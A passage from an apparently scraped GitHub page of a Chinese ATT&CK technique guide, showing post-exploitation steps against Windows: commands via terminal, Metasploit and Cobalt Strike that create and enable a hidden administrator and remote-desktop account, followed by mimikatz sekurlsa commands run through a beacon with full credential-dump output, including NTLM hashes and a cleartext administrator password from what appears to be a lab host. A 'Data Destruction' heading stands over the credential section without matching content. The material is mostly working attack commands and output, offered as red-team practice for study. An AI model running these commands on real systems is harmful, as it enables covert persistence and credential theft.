<h4><a id="user-content-terminal下操作-30" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-30"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<pre><code>net user support_388945a0 somepasswordhere /add /y
net localgroup administrators support_388945a0 /add
net localgroup "remote desktop users" support_388945a0 /add

</code></pre>
<pre><code>C:\Users\Administrator\Desktop\powrshell&gt;net user support_388945a0 somepasswordhere /add /y
命令成功完成。


C:\Users\Administrator\Desktop\powrshell&gt;net localgroup administrators support_388945a0 /add
命令成功完成。


C:\Users\Administrator\Desktop\powrshell&gt;net localgroup "remote desktop users"
别名     remote desktop users
注释     此组中的成员被授予远程登录的权限

成员

-------------------------------------------------------------------------------
命令成功完成。


C:\Users\Administrator\Desktop\powrshell&gt;support_388945a0 /add
'support_388945a0' 不是内部或外部命令，也不是可运行的程序
或批处理文件。

C:\Users\Administrator\Desktop\powrshell&gt;net user

\\DESKTOP-QQF0MLN 的用户帐户

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
support_388945a0         WDAGUtilityAccount
命令成功完成。

</code></pre>
<h4><a id="user-content-msf下操作-26" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-26"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>post/windows/manage/add_user_domain</p>
</blockquote>
<pre><code>msf5 post(windows/manage/add_user_domain) &gt; exploit 

[*] Running module on ROOT-5DE52AC98B
[-] This host is not part of a domain.
[*] Post module execution completed

</code></pre>
<h4><a id="user-content-cs下操作-34" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-34"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<pre><code>shell net user support_388945a0 somepasswordhere /add /y
shell net localgroup administrators support_388945a0 /add
shell net localgroup "remote desktop users" support_388945a0 /add

</code></pre>
<h3><a id="user-content-enable-support_388945a0-account启用support_388945a0账户" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#enable-support_388945a0-account%E5%90%AF%E7%94%A8support_388945a0%E8%B4%A6%E6%88%B7"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Enable "support_388945a0" account（启用“support_388945a0”账户）</h3>
<h4><a id="user-content-terminal下操作-31" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-31"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<pre><code>net user support_388945a0 /active:yes
net localgroup administrators support_388945a0 /add
net localgroup "remote desktop users" support_388945a0 /add

</code></pre>
<h4><a id="user-content-cs下操作-35" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-35"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<pre><code>shell net user support_388945a0 /active:yes
shell net localgroup administrators support_388945a0 /add
shell net localgroup "remote desktop users" support_388945a0 /add

</code></pre>
<h2><a id="user-content-data-destruction数据销毁" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#data-destruction%E6%95%B0%E6%8D%AE%E9%94%80%E6%AF%81"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Data Destruction(数据销毁)</h2>
<h3><a id="user-content-dump-credentials-from-lsass从lsass转储凭据" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#dump-credentials-from-lsass%E4%BB%8Elsass%E8%BD%AC%E5%82%A8%E5%87%AD%E6%8D%AE"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Dump credentials from LSASS（从LSASS转储凭据）</h3>
<h4><a id="user-content-cs下操作-36" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-36"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<pre><code>mimikatz !sekurlsa::logonpasswords
mimikatz !sekurlsa::msv
mimikatz !sekurlsa::kerberos
mimikatz !sekurlsa::wdigest

</code></pre>
<div class="highlight highlight-source-shell"><pre>beacon<span class="pl-k">&gt;</span> mimikatz <span class="pl-k">!</span>sekurlsa::logonpasswords
[<span class="pl-k">*</span>] Tasked beacon to run mimikatz<span class="pl-s"><span class="pl-pds">'</span>s !sekurlsa::logonpasswords command</span>
<span class="pl-s">[+] host called home, sent: 841299 bytes</span>
<span class="pl-s">[+] received output:</span>
<span class="pl-s"></span>
<span class="pl-s">Authentication Id : 0 ; 996 (00000000:000003e4)</span>
<span class="pl-s">Session           : Service from 0</span>
<span class="pl-s">User Name         : NETWORK SERVICE</span>
<span class="pl-s">Domain            : NT AUTHORITY</span>
<span class="pl-s">Logon Server      : (null)</span>
<span class="pl-s">Logon Time        : 2019-9-7 10:11:34</span>
<span class="pl-s">SID               : S-1-5-20</span>
<span class="pl-s">	msv :	</span>
<span class="pl-s">	 [00000002] Primary</span>
<span class="pl-s">	 * Username : ROOT-5DE52AC98B$</span>
<span class="pl-s">	 * Domain   : WORKGROUP</span>
<span class="pl-s">	 * LM       : aad3b435b51404eeaad3b435b51404ee</span>
<span class="pl-s">	 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0</span>
<span class="pl-s">	 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709</span>
<span class="pl-s">	wdigest :	</span>
<span class="pl-s">	 * Username : ROOT-5DE52AC98B$</span>
<span class="pl-s">	 * Domain   : WORKGROUP</span>
<span class="pl-s">	 * Password : (null)</span>
<span class="pl-s">	kerberos :	</span>
<span class="pl-s">	 * Username : root-5de52ac98b$</span>
<span class="pl-s">	 * Domain   : WORKGROUP</span>
<span class="pl-s">	 * Password : (null)</span>
<span class="pl-s">	ssp :	</span>
<span class="pl-s">	credman :	</span>
<span class="pl-s"></span>
<span class="pl-s">Authentication Id : 0 ; 333357 (00000000:0005162d)</span>
<span class="pl-s">Session           : Interactive from 0</span>
<span class="pl-s">User Name         : Administrator</span>
<span class="pl-s">Domain            : ROOT-5DE52AC98B</span>
<span class="pl-s">Logon Server      : ROOT-5DE52AC98B</span>
<span class="pl-s">Logon Time        : 2019-9-7 10:15:25</span>
<span class="pl-s">SID               : S-1-5-21-1911985068-4225083820-4011728908-500</span>
<span class="pl-s">	msv :	</span>
<span class="pl-s">	 [00000002] Primary</span>
<span class="pl-s">	 * Username : Administrator</span>
<span class="pl-s">	 * Domain   : ROOT-5DE52AC98B</span>
<span class="pl-s">	 * LM       : 44efce164ab921caaad3b435b51404ee</span>
<span class="pl-s">	 * NTLM     : 32ed87bdb5fdc5e9cba88547376818d4</span>
<span class="pl-s">	 * SHA1     : 6ed5833cf35286ebf8662b7b5949f0d742bbec3f</span>
<span class="pl-s">	wdigest :	</span>
<span class="pl-s">	 * Username : Administrator</span>
<span class="pl-s">	 * Domain   : ROOT-5DE52AC98B</span>
<span class="pl-s">	 * Password : 123456</span>
<span class="pl-s">	kerberos :	</span>
<span class="pl-s">	 * Username : Administrator</span>
<span class="pl-s">	 * Domain   : ROOT-5DE52AC98B</span>
<span class="pl-s">	 * Password : 123456</span>
<span class="pl-s">	ssp :	</span>
<span class="pl-s">	credman :	</span>
<span class="pl-s"></span>
<span class="pl-s">Authentication Id : 0 ; 997 (00000000:000003e5)</span>
<span class="pl-s">Session           : Service from 0</span>
<span class="pl-s">User Name         : LOCAL SERVICE</span>
<span class="pl-s">Domain            : NT AUTHORITY</span>
<span class="pl-s">Logon Server      : (null)</span>
<span class="pl-s">Logon Time        : 2019-9-7 10:11:34</span>
<span class="pl-s">SID               : S-1-5-19</span>
<span class="pl-s">	msv :	</span>
<span class="pl-s">	wdigest :	</span>
<span class="pl-s">	kerberos :	</span>
<span class="pl-s">	 * Username : (null)</span>
<span class="pl-s">	 * Domain   : (null)</span>
<span class="pl-s">	 * Password : (null)</span>
<span class="pl-s">	ssp :	</span>
<span class="pl-s">	credman :	</span>
<span class="pl-s"></span>
<span class="pl-s">Authentication Id : 0 ; 53191 (00000000:0000cfc7)</span>
<span class="pl-s">Session           : UndefinedLogonType from 0</span>
<span class="pl-s">User Name         : (null)</span>
<span class="pl-s">Domain            : (null)</span>
<span class="pl-s">Logon Server      : (null)</span>
<span class="pl-s">Logon Time        : 2019-9-7 10:11:34</span>
<span class="pl-s">SID               : </span>
<span class="pl-s">	msv :	</span>
<span class="pl-s">	wdigest :	</span>
<span class="pl-s">	kerberos :	</span>
<span class="pl-s">	ssp :	</span>
<span class="pl-s">	credman :	</span>
<span class="pl-s"></span>
<span class="pl-s">Authentication Id : 0 ; 999 (00000000:000003e7)</span>
<span class="pl-s">Session           : UndefinedLogonType from 0</span>
<span class="pl-s">User Name         : ROOT-5DE52AC98B$</span>
<span class="pl-s">Domain            : WORKGROUP</span>
<span class="pl-s">Logon Server      : (null)</span>
<span class="pl-s">Logon Time        : 2019-9-7 10:11:34</span>
<span class="pl-s">SID               : S-1-5-18</span>
<span class="pl-s">	msv :	</span>
<span class="pl-s">	wdigest :	</span>
<span class="pl-s">	kerberos :	</span>
<span class="pl-s">	 * Username : root-5de52ac98b$</span>
<span class="pl-s">	 * Domain   : WORKGROUP</span>
<span class="pl-s">	 * Password : (null)</span>
<span class="pl-s">	ssp :	</span>
<span class="pl-s">	credman :	</span>
<span class="pl-s"></span>
<span class="pl-s"></span>
<span class="pl-s">beacon&gt; mimikatz !sekurlsa::msv</span>
<span class="pl-s">[*] Tasked beacon to run mimikatz<span class="pl-pds">'</span></span>s <span class="pl-k">!</span>sekurlsa::msv <span class="pl-c1">command</span>
[+] host called home, sent: 841288 bytes
[+] received output:

Authentication Id <span class="pl-c1">:</span> 0 <span class="pl-k">;</span> 996 (00000000:000003e4)
Session           <span class="pl-c1">:</span> Service from 0
User Name         <span class="pl-c1">:</span> NETWORK SERVICE
Domain            <span class="pl-c1">:</span> NT AUTHORITY
Logon Server      <span class="pl-c1">:</span> (null)
Logon Time        <span class="pl-c1">:</span> 2019-9-7 10:11:34
SID               <span class="pl-c1">:</span> S-1-5-20
	msv <span class="pl-c1">:</span>	
	 [00000002] Primary
	 <span class="pl-k">*</span> Username <span class="pl-c1">:</span> ROOT-5DE52AC98B$
	 <span class="pl-k">*</span> Domain   <span class="pl-c1">:</span> WORKGROUP
	 <span class="pl-k">*</span> LM       <span class="pl-c1">:</span> aad3b435b51404eeaad3b435b51404ee
	 <span class="pl-k">*</span> NTLM     <span class="pl-c1">:</span> 31d6cfe0d16ae931b73c59d7e0c089c0
	 <span class="pl-k">*</span> SHA1     <span class="pl-c1">:</span> da39a3ee5e6b4b0d3255bfef95601890afd80709

Authentication Id <span class="pl-c1">:</span> 0 <span class="pl-k">;</span> 333357 (00000000:0005162d)
Session           <span class="pl-c1">:</span> Interactive from 0
User Name         <span class="pl-c1">:</span> Administrator
Domain            <span class="pl-c1">:</span> ROOT-5DE52AC98B
Logon Server      <span class="pl-c1">:</span> ROOT-5DE52AC98B
Logon Time        <span class="pl-c1">:</span> 2019-9-7 10:15:25
SID               <span class="pl-c1">:</span> S-1-5-21-1911985068-4225083820-4011728908-500
	msv <span class="pl-c1">:</span>	
	 [00000002] Primary
	 <span class="pl-k">*</span> Username <span class="pl-c1">:</span> Administrator
	 <span class="pl-k">*</span> Domain   <span class="pl-c1">:</span> ROOT-5DE52AC98B
	 <span class="pl-k">*</span> LM       <span class="pl-c1">:</span> 44efce164ab921caaad3b435b51404ee
	 <span class="pl-k">*</span> NTLM     <span class="pl-c1">:</span> 32ed87bdb5fdc5e9cba88547376818d4
	 <span class="pl-k">*</span> SHA1     <span class="pl-c1">:</span> 6ed5833cf35286ebf8662b7b5949f0d742bbec3f

Authentication Id <span class="pl-c1">:</span> 0 <span class="pl-k">;</span> 997 (00000000:000003e5)
Session           <span class="pl-c1">:</span> Service from 0
User Name         <span class="pl-c1">:</span> LOCAL SERVICE
Domain            <span class="pl-c1">:</span> NT AUTHORITY
Logon Server      <span class="pl-c1">:</span> (null)
Logon Time        <span class="pl-c1">:</span> 2019-9-7 10:11:34
SID               <span class="pl-c1">:</span> S-1-5-19
	msv <span class="pl-c1">:</span>	

Authentication Id <span class="pl-c1">:</span> 0 <span class="pl-k">;</span> 53191 (00000000:0000cfc7)
Session           <span class="pl-c1">:</span> UndefinedLogonType from 0
User Name         <span class="pl-c1">:</span> (null)
Domain            <span class="pl-c1">:</span> (null)
Logon Server      <span class="pl-c1">:</span> (null)
Logon Time        <span class="pl-c1">:</span> 2019-9-7 10:11:34
SID               <span class="pl-c1">:</span> 
	msv <span class="pl-c1">:</span>	

Authentication Id <span class="pl-c1">:</span> 0 <span class="pl-k">;</span> 999 (00000000:000003e7)
Session           <span class="pl-c1">:</span> UndefinedLogonType from 0
User Name         <span class="pl-c1">:</span> ROOT-5DE52AC98B$
Domain            <span class="pl-c1">:</span> WORKGROUP
Logon Server      <span class="pl-c1">:</span> (null)
Logon Time        <span class="pl-c1">:</span> 2019-9-7 10:11:34
SID               <span class="pl-c1">:</span> S-1-5-18
	msv <span class="pl-c1">:</span>	


beacon<span class="pl-k">&gt;</span> mimikatz <span class="pl-k">!</span>sekurlsa::kerberos
[<span class="pl-k">*</span>] Tasked beacon to run mimikatz<span class="pl-s"><span class="pl-pds">'</span>s !sekurlsa::kerberos command</span>
<span class="pl-s">[+] host called home, sent: 841293 bytes</span>
<span class="pl-s">[+] received output:</span>
<span class="pl-s"></span>
<span class="pl-s">Authentication Id : 0 ; 996 (00000000:000003e4)</span>
<span class="pl-s">Session           : Service from 0</span>
<span class="pl-s">User Name         : NETWORK SERVICE</span>
<span class="pl-s">Domain            : NT AUTHORITY</span>
<span class="pl-s">Logon Server      : (null)</span>
<span class="pl-s">Logon Time        : 2019-9-7 10:11:34</span>
<span class="pl-s">SID               : S-1-5-20</span>
<span class="pl-s">	kerberos :	</span>
<span class="pl-s">	 * Username : root-5de52ac98b$</span>
<span class="pl-s">	 * Domain   : WORKGROUP</span>
<span class="pl-s">	 * Password : (null)</span>
<span class="pl-s"></span>
<span class="pl-s">Authentication Id : 0 ; 333357 (00000000:0005162d)</span>
<span class="pl-s">Session           : Interactive from 0</span>
<span class="pl-s">User Name         : Administrator</span>
<span class="pl-s">Domain            : ROOT-5DE52AC98B</span>
<span class="pl-s">Logon Server      : ROOT-5DE52AC98B</span>
<span class="pl-s">Logon Time        : 2019-9-7 10:15:25</span>
<span class="pl-s">SID               : S-1-5-21-1911985068-4225083820-4011728908-500</span>
<span class="pl-s">	kerberos :	</span>
<span class="pl-s">	 * Username : Administrator</span>
<span class="pl-s">	 * Domain   : ROOT-5DE52AC98B</span>
<span class="pl-s">	 * Password : 123456</span>
<span class="pl-s"></span>
<span class="pl-s">Authentication Id : 0 ; 997 (00000000:000003e5)</span>
<span class="pl-s">Session           : Service from 0</span>
<span class="pl-s">User Name         : LOCAL SERVICE</span>
<span class="pl-s">Domain            : NT AUTHORITY</span>
<span class="pl-s">Logon Server      : (null)</span>
<span class="pl-s">Logon Time        : 2019-9-7 10:11:34</span>
<span class="pl-s">SID               : S-1-5-19</span>
<span class="pl-s">	kerberos :	</span>
<span class="pl-s">	 * Username : (null)</span>
<span class="pl-s">	 * Domain   : (null)</span>
<span class="pl-s">	 * Password : (null)</span>
<span class="pl-s"></span>
<span class="pl-s">Authentication Id : 0 ; 53191 (00000000:0000cfc7)</span>
<span class="pl-s">Session           : UndefinedLogonType from 0</span>
<span class="pl-s">User Name         : (null)</span>
<span class="pl-s">Domain            : (null)</span>
<span class="pl-s">Logon Server      : (null)</span>
<span class="pl-s">Logon Time        : 2019-9-7 10:11:34</span>
<span class="pl-s">SID               : </span>
<span class="pl-s">	kerberos :	</span>
<span class="pl-s"></span>
<span class="pl-s">Authentication Id : 0 ; 999 (00000000:000003e7)</span>
<span class="pl-s">Session           : UndefinedLogonType from 0</span>
<span class="pl-s">User Name         : ROOT-5DE52AC98B$</span>
<span class="pl-s">Domain            : WORKGROUP</span>
<span class="pl-s">Logon Server      : (null)</span>
<span class="pl-s">Logon Time        : 2019-9-7 10:11:34</span>
<span class="pl-s">SID               : S-1-5-18</span>
<span class="pl-s">	kerberos :	</span>
<span class="pl-s">	 * Username : root-5de52ac98b$</span>
<span class="pl-s">	 * Domain   : WORKGROUP</span>
<span class="pl-s">	 * Password : (null)</span>
<span class="pl-s">beacon&gt; mimikatz !sekurlsa::wdigest</span>
<span class="pl-s">[*] Tasked beacon to run mimikatz<span class="pl-pds">'</span></span>s <span class="pl-k">!</span>sekurlsa::wdigest <span class="pl-c1">command</span>
[+] host called home, sent: 841292 bytes
[+] received output:

Authentication Id <span class="pl-c1">:</span> 0 <span class="pl-k">;</span> 996 (00000000:000003e4)
Session           <span class="pl-c1">:</span> Service from 0
User Name         <span class="pl-c1">:</span> NETWORK SERVICE
Domain            <span class="pl-c1">:</span> NT AUTHORITY
Logon Server      <span class="pl-c1">:</span> (null)
Logon Time        <span class="pl-c1">:</span> 2019-9-7 10:11:34
SID               <span class="pl-c1">:</span> S-1-5-20
	wdigest <span class="pl-c1">:</span>	
	 <span class="pl-k">*</span> Username <span class="pl-c1">:</span> ROOT-5DE52AC98B$
	 <span class="pl-k">*</span> Domain   <span class="pl-c1">:</span> WORKGROUP
	 <span class="pl-k">*</span> Password <span class="pl-c1">:</span> (null)

Authentication Id <span class="pl-c1">:</span> 0 <span class="pl-k">;</span> 333357 (00000000:0005162d)
Session           <span class="pl-c1">:</span> Interactive from 0
User Name         <span class="pl-c1">:</span> Administrator
Domain            <span class="pl-c1">:</span> ROOT-5DE52AC98B
Logon Server      <span class="pl-c1">:</span> ROOT-5DE52AC98B
Logon Time        <span class="pl-c1">:</span> 2019-9-7 10:15:25
SID               <span class="pl-c1">:</span> S-1-5-21-1911985068-4225083820-4011728908-500
	wdigest <span class="pl-c1">:</span>	
	 <span class="pl-k">*</span> Username <span class="pl-c1">:</span> Administrator
	 <span class="pl-k">*</span> Domain   <span class="pl-c1">:</span> ROOT-5DE52AC98B
	 <span class="pl-k">*</span> Password <span class="pl-c1">:</span> 123456

Authentication Id <span class="pl-c1">:</span> 0 <span class="pl-k">;</span> 997 (00000000:000003e5)
Session           <span class="pl-c1">:</span> Service from 0
User Name         <span class="pl-c1">:</span> LOCAL SERVICE
Domain            <span class="pl-c1">:</span> NT AUTHORITY
Logon Server      <span class="pl-c1">:</span> (null)
Logon Time        <span class="pl-c1">:</span> 2019-9-7 10:11:34
SID               <span class="pl-c1">:</span> S-1-5-19
	wdigest <span class="pl-c1">:</span>	

Authentication Id <span class="pl-c1">:</span> 0 <span class="pl-k">;</span> 53191 (00000000:0000cfc7)
Session           <span class="pl-c1">:</span> UndefinedLogonType from 0
User Name         <span class="pl-c1">:</span> (null)
Domain            <span class="pl-c1">:</span> (null)
Logon Server      <span class="pl-c1">:</span> (null)
Logon Time        <span class="pl-c1">:</span> 2019-9-7 10:11:34
SID               <span class="pl-c1">:</span> 
	wdigest <span class="pl-c1">:</span>	

Authentication Id <span class="pl-c1">:</span> 0 <span class="pl-k">;</span> 999 (00000000:000003e7)
Session           <span class="pl-c1">:</span> UndefinedLogonType from 0
User Name         <span class="pl-c1">:</span> ROOT-5DE52AC98B$
Domain            <span class="pl-c1">:</span> WORKGROUP
Logon Server      <span class="pl-c1">:</span> (null)
Logon Time        <span class="pl-c1">:</span> 2019-9-7 10:11:34
SID               <span class="pl-c1">:</span> S-1-5-18
	wdigest <span class="pl-c1">:</span>	
</pre></div>
</article>
  </div>

    </div>

  

  <details class="details-reset details-overlay details-overlay-dark">
    <summary data-hotkey="l" aria-label="Jump to line" role="button"></summary>
    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast linejump" aria-label="Jump to line" role="dialog" aria-modal="true">
      <!-- '"` --><!-- </textarea></xmp> --><form class="js-jump-to-line-form Box-body d-flex" action="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md" accept-charset="UTF-8" method="get"><input name="utf8" type="hidden" value="✓">
        <input class="form-control flex-auto mr-3 linejump-input js-jump-to-line-field" type="text" placeholder="Jump to line…" aria-label="Jump to line" autofocus="">
        <button type="submit" class="btn" data-close-dialog="">Go</button>
</form>    </details-dialog>
  </details>



  </div>
</div>

    </main>
  </div>
  

  </div>

        
<div class="footer container-lg width-full p-responsive" role="contentinfo">
  <div class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light ">
    <ul class="list-style-none d-flex flex-wrap col-12 col-lg-5 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
      <li class="mr-3 mr-lg-0">© 2019 <span title="0.53588s from unicorn-64cfcb44bd-v4ngs">GitHub</span>, Inc.</li>
        <li class="mr-3 mr-lg-0"><a data-ga-click="Footer, go to terms, text:terms" href="https://github.com/site/terms">Terms</a></li>
        <li class="mr-3 mr-lg-0"><a data-ga-click="Footer, go to privacy, text:privacy" href="https://github.com/site/privacy">Privacy</a></li>
        <li class="mr-3 mr-lg-0"><a data-ga-click="Footer, go to security, text:security" href="https://github.com/security">Security</a></li>
        <li class="mr-3 mr-lg-0"><a href="https://githubstatus.com/" data-ga-click="Footer, go to status, text:status">Status</a></li>
        <li><a data-ga-click="Footer, go to help, text:help" href="https://help.github.com/">Help</a></li>
    </ul>

    <a aria-label="Homepage" title="GitHub" class="footer-octicon d-none d-lg-block mx-lg-4" href="https://github.com/">
      <svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="24" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"></path></svg>
</a>
   <ul class="list-style-none d-flex flex-wrap col-12 col-lg-5 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
        <li class="mr-3 mr-lg-0"><a data-ga-click="Footer, go to contact, text:contact" href="https://github.com/contact">Contact GitHub</a></li>
